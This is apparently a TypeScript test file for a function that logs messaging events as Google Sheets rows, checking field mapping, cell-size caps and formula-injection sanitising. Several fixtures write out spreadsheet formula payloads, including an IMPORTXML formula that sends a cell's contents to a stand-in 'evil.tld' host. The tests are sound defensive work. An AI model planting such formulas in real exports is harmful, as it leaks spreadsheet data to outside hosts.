import { test } from 'node:test';
import assert from 'node:assert/strict';
import { buildRow, COLUMNS } from './row.ts';

const T = new Date('2026-06-22T10:00:00.000Z');

test('received maps to an in row with sender name', () => {
  const row = buildRow({
    event: 'message:received', sessionId: 's1', timestamp: T, source: 'Engine',
    data: {
      id: 'M1', from: '62811@c.us', to: 'me', chatId: '62811@c.us', body: 'hi',
      type: 'text', fromMe: false, isGroup: false, contact: { pushName: 'Budi' },
    },
  });
  assert.equal(row.length, COLUMNS.length);
  assert.deepEqual(row, [
    '2026-06-22T10:00:00.000Z', 's1', 'message:received', 'in', '62811@c.us',
    '62811@c.us', 'me', 'Budi', 'false', 'text', 'hi', 'M1', '', '',
  ]);
});

test('sent maps to an out row', () => {
  const row = buildRow({
    event: 'message:sent', sessionId: 's1', timestamp: T, source: 'Engine',
    data: { id: 'M2', from: 'me', to: '62811@c.us', chatId: '62811@c.us', body: 'yo', type: 'text', fromMe: true, isGroup: false },
  });
  assert.equal(row[3], 'out');
  assert.equal(row[11], 'M2');
  assert.equal(row[7], ''); // no contact -> empty senderName
});

test('failed maps error and input fields, no message id', () => {
  const row = buildRow({
    event: 'message:failed', sessionId: 's1', timestamp: T, source: 'MessageService',
    data: { sessionId: 's1', error: 'boom', input: { chatId: '62811@c.us', text: 'bye' } },
  });
  assert.equal(row[3], 'out');
  assert.equal(row[4], '62811@c.us'); // chatId from input
  assert.equal(row[6], '62811@c.us'); // to mirrors chatId for a failed send
  assert.equal(row[10], 'bye');        // body from input.text
  assert.equal(row[13], 'boom');       // error
  assert.equal(row[11], '');           // no messageId
});

test('absent fields degrade to empty strings', () => {
  const row = buildRow({ event: 'message:received', sessionId: undefined, timestamp: T, source: 'Engine', data: {} });
  assert.equal(row.length, COLUMNS.length);
  assert.equal(row[1], '');  // sessionId
  assert.equal(row[10], ''); // body
});

test('sanitizes formula-injection in attacker-controlled cells', () => {
  const row = buildRow({
    event: 'message:received', sessionId: 's1', timestamp: T, source: 'Engine',
    data: { id: 'M9', from: '62811@c.us', to: 'me', chatId: '62811@c.us',
            body: '=HYPERLINK("http://evil","x")', type: 'text', fromMe: false, isGroup: false,
            contact: { pushName: '=1+1' } },
  });
  assert.equal(row[10], `'=HYPERLINK("http://evil","x")`); // body neutralized
  assert.equal(row[7], `'=1+1`);                            // senderName neutralized
  assert.equal(row[5], '62811@c.us');                       // benign value untouched
});

test('free-text quotes a formula-like leading +/- but preserves a phone/number; id fields stay fully guarded', () => {
  const row = buildRow({
    event: 'message:received', sessionId: 's1', timestamp: T, source: 'Engine',
    data: { id: 'M9', from: '+62811@c.us', to: 'me', chatId: '62811@c.us',
            body: '+62812 call me', type: 'text', fromMe: false, isGroup: false,
            contact: { pushName: '-IMPORTXML("http://evil")' } },
  });
  assert.equal(row[10], '+62812 call me');            // body: '+' before a digit = phone number, NOT quoted
  assert.equal(row[7], `'-IMPORTXML("http://evil")`); // senderName: '-' before a letter = formula, quoted
  assert.equal(row[5], `'+62811@c.us`);               // from: id field, '+' STILL quoted (full guard)
  assert.equal(row[6], 'me');                         // benign id untouched
});

test('a formula that starts with a digit is quoted, unlike a phone number or a negative measurement', () => {
  // Testing only the character right after the sign passed anything beginning with a digit, so a live
  // formula like `-1+IMPORTXML(...)` reached the sheet unquoted. Excel and Sheets both parse a cell
  // beginning `-1+` as a formula, and on the CSV round-trip this guard exists to defend, it fires.
  const row = buildRow({
    event: 'message:received', sessionId: 's1', timestamp: T, source: 'Engine',
    data: { id: 'M9', from: 'x', to: 'y', chatId: 'c', type: 'text', fromMe: false, isGroup: false,
            body: '-1+IMPORTXML("https://evil.tld/?d="&A2,"//a")',
            contact: { pushName: '+1+HYPERLINK("http://evil","x")' } },
  });
  assert.equal(row[10], `'-1+IMPORTXML("https://evil.tld/?d="&A2,"//a")`, 'digit after the sign is not a pass');
  assert.equal(row[7], `'+1+HYPERLINK("http://evil","x")`);
});

test('a phone number keeps its brackets and a message after a phone number stays readable', () => {
  // The two shapes the digit rule exists to protect. Neither carries formula machinery, so neither is
  // quoted, and an operator reading the sheet sees what the contact actually sent.
  const row = buildRow({
    event: 'message:received', sessionId: 's1', timestamp: T, source: 'Engine',
    data: { id: 'M9', from: 'x', to: 'y', chatId: 'c', type: 'text', fromMe: false, isGroup: false,
            body: '+62 (812) 3456-7890', contact: { pushName: '-1.5' } },
  });
  assert.equal(row[10], '+62 (812) 3456-7890');
  assert.equal(row[7], '-1.5');
});

test('free-text keeps a negative number but quotes plus-then-space-then-formula', () => {
  const row = buildRow({
    event: 'message:received', sessionId: 's1', timestamp: T, source: 'Engine',
    data: { id: 'M9', from: 'x', to: 'y', chatId: 'c', type: 'text', fromMe: false, isGroup: false,
            body: '-5 degrees today', contact: { pushName: '+ IMPORTXML("http://evil")' } },
  });
  assert.equal(row[10], '-5 degrees today');            // '-5' is a number → NOT quoted
  assert.equal(row[7], `'+ IMPORTXML("http://evil")`);  // '+ ' (space after) is not a number → quoted
});

test('caps an oversized free-text cell to the Google Sheets 50000-char limit', () => {
  const big = 'a'.repeat(60000);
  const row = buildRow({
    event: 'message:received', sessionId: 's1', timestamp: T, source: 'Engine',
    data: { id: 'M9', from: 'x', to: 'y', chatId: 'c', body: big, type: 'text', fromMe: false, isGroup: false },
  });
  // A single over-limit cell would 400 the whole append batch and stall all logging; cap it so it can't.
  assert.equal(row[10].length, 50000);
});

// message:failed now fires from every sender with the real `type`, not just from sendText — and a media
// send's DTO carries its caption in `caption`. A hardcoded 'text' plus an `input.text` read logged every
// image/video/document/poll failure as a text message with an empty body.
test('a failed image send logs its real type and its caption as the body', () => {
  const row = buildRow({
    event: 'message:failed', sessionId: 's1', timestamp: new Date(0), source: 'MessageService',
    data: { sessionId: 's1', type: 'image', error: 'engine down',
            input: { chatId: '62812@c.us', url: 'https://x/y.jpg', caption: 'invoice' } },
  } as never);
  assert.equal(row[COLUMNS.indexOf('type')], 'image');
  assert.equal(row[COLUMNS.indexOf('body')], 'invoice');
  assert.equal(row[COLUMNS.indexOf('chatId')], '62812@c.us');
});

test('a failed text send still logs as text', () => {
  const row = buildRow({
    event: 'message:failed', sessionId: 's1', timestamp: new Date(0), source: 'MessageService',
    data: { sessionId: 's1', type: 'text', error: 'boom', input: { chatId: 'c@wa', text: 'hello' } },
  } as never);
  assert.equal(row[COLUMNS.indexOf('type')], 'text');
  assert.equal(row[COLUMNS.indexOf('body')], 'hello');
});

// A pre-0.12 host emitted no `type` at all; the row must stay readable rather than log an empty column.
test('a payload without a type falls back to text', () => {
  const row = buildRow({
    event: 'message:failed', sessionId: 's1', timestamp: new Date(0), source: 'MessageService',
    data: { sessionId: 's1', error: 'boom', input: { chatId: 'c@wa', text: 'hi' } },
  } as never);
  assert.equal(row[COLUMNS.indexOf('type')], 'text');
});

// Bulk sends emit the shared content, with the recipient on the enclosing item — so there is no chatId
// to log. Blank is the honest value; the row is still attributable by sessionId + error + timestamp.
test('a bulk failure logs blank recipient columns rather than inventing one', () => {
  const row = buildRow({
    event: 'message:failed', sessionId: 's1', timestamp: new Date(0), source: 'BulkMessageService',
    data: { sessionId: 's1', type: 'image', error: 'rate limited', input: { caption: 'promo' } },
  } as never);
  assert.equal(row[COLUMNS.indexOf('chatId')], '');
  assert.equal(row[COLUMNS.indexOf('type')], 'image');
  assert.equal(row[COLUMNS.indexOf('body')], 'promo');
});

test('a cell cap never splits a surrogate pair', () => {
  // The cap lands mid-emoji when the 50 000th code unit is a high surrogate. A lone surrogate is not
  // valid Unicode and cannot be encoded as UTF-8, which is what the host does to the request body, so
  // the one row this cap exists to make safe was the row that corrupted the append.
  const emoji = '\u{1F600}'; // one astral char = two UTF-16 code units
  const row = buildRow({
    event: 'message:received', sessionId: 's1', timestamp: T, source: 'Engine',
    data: {
      id: 'M1', from: '62811@c.us', to: 'me', chatId: '62811@c.us',
      body: 'a'.repeat(49_999) + emoji + emoji,
      type: 'text', fromMe: false, isGroup: false,
    },
  });
  const cell = row[10]; // body column
  assert.ok(cell.length <= 50_000);
  assert.ok(cell.startsWith('a'.repeat(100)), 'the body cell, not a neighbour');
  const tail = cell.charCodeAt(cell.length - 1);
  assert.equal(tail >= 0xd800 && tail <= 0xdbff, false, 'must not end on a lone high surrogate');
  // Well-formedness is the actual invariant, and it survives the UTF-8 round trip the host performs.
  assert.equal(new TextDecoder().decode(new TextEncoder().encode(cell)), cell);
});
